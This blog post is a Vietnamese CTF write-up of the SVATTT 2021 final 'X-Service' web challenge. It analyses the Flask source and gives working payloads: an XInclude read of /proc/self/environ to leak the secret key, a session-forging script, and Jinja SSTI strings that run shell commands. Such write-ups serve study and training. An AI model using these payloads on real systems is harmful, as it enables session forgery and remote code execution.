---
layout: post
title: "WRITEUP SVATTT FINAL 2021: WEB"
categories: CTF
toc: true
render_with_liquid: false
---
Hé lô mọi người. Ở vòng loại của svattt vừa rồi thì mình không được vô chung kết để chinh chiến vòng đấu hấp dẫn này. Hôm nay là ngày diễn ra chung kết svattt, mình chỉ biết ngồi nhìn các đội chơi thấy hơi buồn 1 chút trong lòng :( , nhưng nhớ đến câu của một người anh nào đó "Không có gì phải buồn hết em, mình có thực lực thua mới buồn không có thực lực thì làm sao phải buồn" nên vì vậy sau khi end giải mình đã xin 1 vài challeng web để làm, tu luyện để hi vọng năm sau có cơ hội vô chung kết. Thôi không luyên thuyên nữa, dưới đây là một số bài mà mình solved được, mình muốn ghi lại vì thấy nó hay cũng như học được nhiều thứ từ những challenge này. Bài viết của niuu baii nên có sai sót thì mọi người góp ý nhé ^^

## Challenge X-Service
Source code và payload mình để ở đây nha [SRC](https://github.com/DauHoangTai/WriteupCTF/tree/master/svattt/2021/final/X-Service)

Bài này thuộc trong AD (Deamon web 01), mình thấy thì bài này khá nhiều đội solved. Bây giờ thì cùng đi phân tích source code mà author cung cấp nhé.

Bài này được author code bằng `python`. Chúng ta được cung cấp 1 file `app.py` và mình sẽ tách từng phần ra phân tích:

```py
import random
import os
from xlib import blacklist as bl, utils as xutils
from flask import Flask, render_template, render_template_string, url_for, redirect, session, request
from flask_socketio import SocketIO, emit, send
from xml.etree import ElementTree, ElementInclude

app = Flask(__name__)
app.config['SECRET_KEY'] = "###CENSORED###"
socketio = SocketIO(app)
```
- Đoạn này thì chỉ có import 1 số lib và setup flask, `SECRET_KEY` được giấu và hiện tại chúng ta không biết nó là gì.

```py
@app.route('/')
def index():
	if 'username' in session:
		return redirect(url_for('dashboard'))
	return redirect(url_for('login'))


@app.route('/dashboard')
def dashboard():
	if 'username' in session:
		return render_template('dashboard.html', name=session['username'])
	return redirect(url_for('login'))
```
- Route `/`: kiểm tra `username` có trong `session` thì sẽ redirect cho chúng ta tới trang `/dashboard`, nếu không thì sẽ redirect tới trang `/login`.
- Router `/dashboard`: kiểm tra `username` có trong `session` thì render ra `dashboard.html` với `name=session['username']`, nếu không thì redirect về `login`

```py
@app.route('/login', methods = ['GET', 'POST'])
def login():
	if 'username' in session:
		redirect(url_for('/dashboard'))
	else:
		if request.method == 'POST':
			username, password, guest = '', '', ''
			try:
				username = request.form["username"]
				password = request.form["password"]
			except:
				pass

			try:
				guest = request.form["guest"]
			except:
				pass

			if len(username)>0 and len(password) > 0:
				res = xutils.login_check(username, password)
				if len(res)>0:
					session['is_admin'] = 0
					session['username'] = username
			elif guest != None and guest == "true":
				session['is_admin'] = 0
				session['username'] = 'guest%s'%(random.randrange(1000000, 9999999))
			return redirect(url_for('dashboard'))
		return render_template('login.html')
```
- Route `/login`: 
	- Kiểm tra `username` có trong session thì redirect tới `/dashboard`. Nếu không thì vô `else`, kiểm tra nếu request bằng POST method, ở đây chúng ta có 3 tham số để truyền vào `username, password, guest`. Kiểm tra len của `username` và `password` > 0 thì đưa 2 tham số này vô func `login_check` (func này được author code ở trong file `utils.py`). Có response thì set session `is_admin = 0` và `username=username` (username mình login vào).
	- `guest=true` thì sẽ không check login, cũng set session `is_admin=0` và `username=guest4955629` (4955629 là random từ khoảng 1000000 -> 9999999, mỗi lần login guest thì số sẽ khác nhau).
	- Cuối cùng redirect tới `dashboard`.

```py
@app.route('/about')
def about():
	return render_template('about.html')

@app.route('/logout')
def logout():
	session.clear()
	return redirect(url_for('login'))

@app.route('/manage')
def manage():
	try:
		if session['is_admin'] == 1:
			black_list = bl.BLACKLIST
			for c in black_list:
				usn = session['username'].replace(c, "")
			if xutils.check_user(usn) == True:
				return render_template_string('Hello ' + usn + ', under development!')
			else:
				return render_template_string(usn + " not available")
		else:
			return redirect(url_for('dashboard'))
	except:
		return redirect(url_for('login'))
```
- Route `/about`: render template `about.html`
- Route `/logout`: Xóa session và redirect về login.
- Route `/manage`: 
	- Func này quan trọng đến việc exploit cho bài. Check session `is_admin=1`, tiếp theo check session `username` nếu chứa char nằm trong `BLACKLIST` (được tạo trong trong file `blacklist.py`) thì sẽ bị replace thành null.
	- Check `usn` (session username) bằng func `check_user` được code trong file `utils.py`. Dù kết quả của func này trả về là gì thì vẫn `render_template_string` 1 đoạn string + `usn` (session username) => có thể SSTI ở đây.

```py
@socketio.on('message')
def handle_message(xpath, xml):
	if 'username' in session:
		if len(xpath) != 0 and len(xml) != 0 and "&" not in xml:
			try:
				res = ''
				root = ElementTree.fromstring(xml.strip())
				ElementInclude.include(root)
				for elem in root.findall(xpath):
					if elem.text != "":
						res += elem.text + ", "
				emit('result', res[:-2])
			except Exception as e:
				emit('result', 'Nani?')
		else:
			emit('result', 'Nani?')
```
- Func `handle_message` được gửi bằng socket. Check len 2 tham số mà chúng ta đưa vào `xpath`, `xml` phải lớn 0 và không được có `&` trong `xml` (chặn 1 số payload xxe cơ bản có thể retrieve files).
- Đoạn code còn lại là xử lí xml bằng lib [xml.etree.ElementTree](https://docs.python.org/3/library/xml.etree.elementtree.html)
- Cuối cùng show ra những `element` trùng với `xpath` mà ta đưa vào.

### IDEA
- Chúng ta cần có `session['is_admin']=1` để vô được route `/manage` và từ đó có thể rce và get flag. Nhưng ở trong code không có chỗ nào mà set session `is_admin=1`.
- Sử dụng login by guess để có thể vô `dashboard`, sau đó chúng ta `XXE injection` để đọc file `app.py` => lấy được `SECRET_KEY` => fake session `is_admin=1` và `username` là payload ssti => thay vô cookie header => như vậy là có thể ssti bình thường.
- Sau một thời gian đọc document về lib `xml.etree.ElementTree` thì thấy được 1 payload này có vẻ khả thi và không sử dụng `&` [here](https://docs.python.org/3/library/xml.etree.elementtree.html#id3)
- Mình có thử payload sử dụng file `dtd` payload này không sài `&` nhưng không có request tới server của mình.

### Payload
Payload read environ để lấy `SECRET_KEY`

```xml
<root>
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="/proc/self/environ" parse="text" />
</foo>
</root>
```
Ở `xpath` thì nhập `*`

File `payload.py`

{% highlight python %}
{% raw %}
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer
import requests
import string
import sys

class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
	def get_signing_serializer(self, secret_key):
		if not secret_key:
			return None
		signer_kwargs = dict(
			key_derivation=self.key_derivation,
			digest_method=self.digest_method
		)
		return URLSafeTimedSerializer(secret_key, salt=self.salt,
		                              serializer=self.serializer,
		                              signer_kwargs=signer_kwargs)

def decodeFlaskCookie(secret_key, cookieValue):
	sscsi = SimpleSecureCookieSessionInterface()
	signingSerializer = sscsi.get_signing_serializer(secret_key)
	return signingSerializer.loads(cookieValue)

def encodeFlaskCookie(secret_key, cookieDict):
	sscsi = SimpleSecureCookieSessionInterface()
	signingSerializer = sscsi.get_signing_serializer(secret_key)
	return signingSerializer.dumps(cookieDict)


if len(sys.argv) < 2:
	print("[+] python3 poc.py <url>")
	exit()

URL = sys.argv[1]

SECRET_KEY = '476345fdc597d6cb6dd68ae949b2694a'
PAYLOAD = {u'is_admin':1,u'username':"""{%print(lipsum|attr("__globals__"))|attr("__getitem__")("os")|attr("popen")("/readflag")|attr("read")()%}"""}

def getSession():
	cookie = encodeFlaskCookie(SECRET_KEY, PAYLOAD)
	return cookie

def getFlag():
	cookies = {"session":getSession()}
	r = requests.get(url=URL+'/manage',cookies=cookies)
	print(r.text)


if __name__ == "__main__":
	getFlag()
{% endraw %}
{% endhighlight %}

Chạy file này với command `python3 payload.py http://34.124.209.122:1337`. Nếu có source deploy trên local thì thay bằng url local
![image](https://user-images.githubusercontent.com/54855855/141679163-21adcb12-0fbc-46f6-b811-a70fc86142d2.png)
BONUS: Tối hôm đó mình solved, có vẻ như chall vẫn đang được patch bằng cách replace thêm 1 số kí tự như `{% raw %}["{{","/", "*", "'", '"', "o","r"]{% endraw %}`. Vì vậy mình không thể solved bằng payload trên mà mình đã thay bằng:
```
{% raw %}
{{config.__class__.__init__.__globals__['os'].system('/?eadflag > /tmp/taidh')}}
{% endraw %}
```
Cuối cùng mình sử dụng `xml` lúc đầu để đọc `environ` để đọc flag bằng đường dẫn `/tmp/taidh`. Nhưng mình không hiểu tại sao vẫn có thể sài `"` `'` và `{% raw %}{{{% endraw %}` bình thường mặc dù nó nằm trong `blacklist`. Chỉ có mỗi `r` bị replace :D

# UPDATING CÁC CHALLENG CÒN LẠI